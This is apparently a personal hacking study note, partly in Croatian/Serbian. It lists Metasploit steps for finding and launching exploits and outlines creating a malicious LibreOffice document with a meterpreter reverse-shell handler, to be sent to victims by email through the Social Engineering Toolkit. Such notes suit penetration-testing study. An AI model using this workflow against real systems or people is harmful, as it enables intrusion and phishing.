202202111013
Tags: [[Hacking]]

# Metasploit
## Finding an exploit
0. use `searchsploit [service] [version]` to find exploits
	1. `searchsploit openssh 7.2`
1. `search exploit [name]`
2. `use [full path to exploit]`
	1. configure exploit `show options` to view variables of exploit
	2. `set [VARIABLE NAME] value`
	3. `RHOSTS` is the IP of the target
3. `check`
	1. some exploits don't support this feature 
4. `exploit`
	1. final step

## Libre exploitation
1. kreirati maliciozni libre
	1.  `search name:libre`
	2. `use ime`
	3. `show options`
		1. pogledati i payload opcije
	4. `run` ce kreirati dokument
	5. setupati payload
		1. `use exploit/multi/handler`
		2. `set payload python/meterpreter/reverse_tcp`
		3. `run` slusati ce za dolazne konekcije
	6. poslati dokument preko maila, koristiti cemo `social engineering toolkit`
2. kreirati handle za konekciju

---
# References
- [msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)